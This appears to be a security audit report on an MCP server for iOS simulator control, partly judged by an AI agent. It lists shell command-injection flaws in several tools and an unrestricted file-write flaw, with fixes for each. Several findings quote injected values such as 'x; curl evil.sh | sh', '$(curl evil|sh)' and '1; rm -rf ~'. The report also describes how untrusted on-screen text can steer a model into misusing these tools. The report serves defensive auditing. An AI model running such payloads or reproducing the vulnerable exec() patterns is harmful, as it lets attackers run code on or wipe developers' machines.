# Agent & MCP security report

Scanned: `/tmp/blind/c30` · 2026-11-23T20:56:47+00:00 · auditor v1.0.0 · mode: reviewed

## Verdict: 🔴 Fix before shipping

| Critical | High | Medium | Low | Info | Dismissed as false alarm | Needs context |
|---|---|---|---|---|---|---|
| 6 | 1 | 0 | 1 | 0 | 1 | 0 |

## What was checked

- MCP servers in config files: **0** · tools found in code: **9** · agent/MCP code files: **1** · agent instruction files: **1**
- Frameworks seen: mcp, modelcontextprotocol

## Findings

### M001 · CRITICAL · ui_swipe passes udid into a shell command
`None:None` · ASI05 Unexpected Code Execution

Scanner missed this one: udid is a free string interpolated into an exec() shell command, same as F001.
> `src/index.ts:271` — `async ({ udid, x_start, y_start, x_end, y_end, delta }) => {`
> `src/index.ts:276` — ``idb ui swipe --udid ${actualUdid} ${deltaArg} ${x_start} ${y_start} ${x_end} ${y_end} --json``

**Fix:** Use execFile('idb', ['ui', ..., '--udid', udid, ...]) (no shell) and validate udid against ^[0-9A-Fa-f-]+$ in the zod schema.

### M002 · CRITICAL · screenshot passes output_path and udid into a shell command
`None:None` · ASI05 Unexpected Code Execution

Scanner missed this one: output_path='/tmp/a.png; curl evil.sh | sh' stays 'absolute' through ensureAbsolutePath and is run by exec() in a shell.
> `src/index.ts:391` — `async ({ udid, output_path, type, display, mask }) => {`
> `src/index.ts:396` — `let command = `xcrun simctl io ${actualUdid} screenshot ${absolutePath}`;`
> `src/index.ts:403` — `const { stderr: stdout } = await execAsync(command);`

**Fix:** execFile('xcrun', ['simctl', 'io', udid, 'screenshot', ...flags, absolutePath]) and validate udid.

### F001 · CRITICAL · CMD-INJECTION
`src/index.ts:140` · ASI05 Unexpected Code Execution

udid is a free string pasted into a shell command run by exec; udid='x; curl evil.sh | sh' runs arbitrary commands on the developer's Mac.
> `src/index.ts:136` — `async ({ udid }) => {`
> `src/index.ts:141` — ``idb ui describe-all --udid ${actualUdid} --json --nested``

**Fix:** Use execFile('idb', ['ui', ..., '--udid', udid, ...]) (no shell) and validate udid against ^[0-9A-Fa-f-]+$ in the zod schema.

### F002 · CRITICAL · CMD-INJECTION
`src/index.ts:182` · ASI05 Unexpected Code Execution

duration and udid are free strings interpolated into an exec() shell command; duration='1; rm -rf ~' runs.
> `src/index.ts:178` — `async ({ duration, udid, x, y }) => {`
> `src/index.ts:181` — `const durationArg = duration ? `--duration ${duration}` : "";`
> `src/index.ts:183` — ``idb ui tap --udid ${actualUdid} ${durationArg} ${x} ${y}  --json``

**Fix:** execFile with an argument array; make duration z.number() and validate udid with a regex.

### F003 · CRITICAL · CMD-INJECTION
`src/index.ts:223` · ASI05 Unexpected Code Execution

text (the string to type, which naturally contains user/page content) is pasted unquoted into a shell command; text='$(curl evil|sh)' executes.
> `src/index.ts:220` — `async ({ udid, text }) => {`
> `src/index.ts:224` — ``idb ui text ${text} --udid ${actualUdid}``

**Fix:** execFile('idb', ['ui', 'text', '--udid', udid, '--', text]).

### F004 · CRITICAL · CMD-INJECTION
`src/index.ts:317` · ASI05 Unexpected Code Execution

udid string reaches an exec() shell command unescaped (x, y are numbers).
> `src/index.ts:314` — `async ({ udid, x, y }) => {`
> `src/index.ts:318` — ``idb ui describe-point --udid ${actualUdid} ${x} ${y} --json``

**Fix:** Use execFile('idb', ['ui', ..., '--udid', udid, ...]) (no shell) and validate udid against ^[0-9A-Fa-f-]+$ in the zod schema.

### M003 · HIGH · screenshot / record_video write to any path (record_video can overwrite with force)
`None:None` · ASI02 Tool Misuse and Exploitation

Absolute paths and '../' are accepted as-is, so a steered model can write or (with force=true) overwrite any file the user can write, e.g. ~/.zshrc, with image/video bytes.
> `src/index.ts:344` — `function ensureAbsolutePath(filePath: string): string {`
> `src/index.ts:346` — `return filePath;`
> `src/index.ts:475` — `const outputFile = ensureAbsolutePath(output_path ?? defaultFileName);`

**Fix:** Resolve the path and require it to stay inside a configured output folder (default ~/Downloads); drop the force flag or require confirmation.

### M004 · LOW · Accessibility text from the simulator returned raw to the model
`None:None` · 

ui_describe_all returns all on-screen labels/text (which can include web or app content written by others) unmarked into the model context, and the same server has shell-reaching tools above.
> `src/index.ts:146` — `content: [{ type: "text", text: stdout }],`

**Fix:** Mark the output as untrusted data; fixing F001-F004/M001-M002 removes the dangerous follow-up.

## Dismissed as false alarms

- F005 ARG-INJECTION `src/index.ts:488` — spawn uses an argument array (no shell); the only free value is outputFile, which ensureAbsolutePath always turns into an absolute path (starts with '/'), so it cannot be read as an option. codec/display/mask are enums. The unrestricted write location is reported as M003.

## Limits

- Static review: the auditor reads code and configs; it does not run servers or attack them. Logic bugs, auth flaws in other services and runtime behaviour can be missed.
- Tool descriptions are checked as written in the code or a tools/list export; a remote server can return different text at runtime (use `pin --check` on exported tools.json).
- AI-assisted: findings are judged by an AI agent with every quote verified against the code; a human should confirm critical fixes.
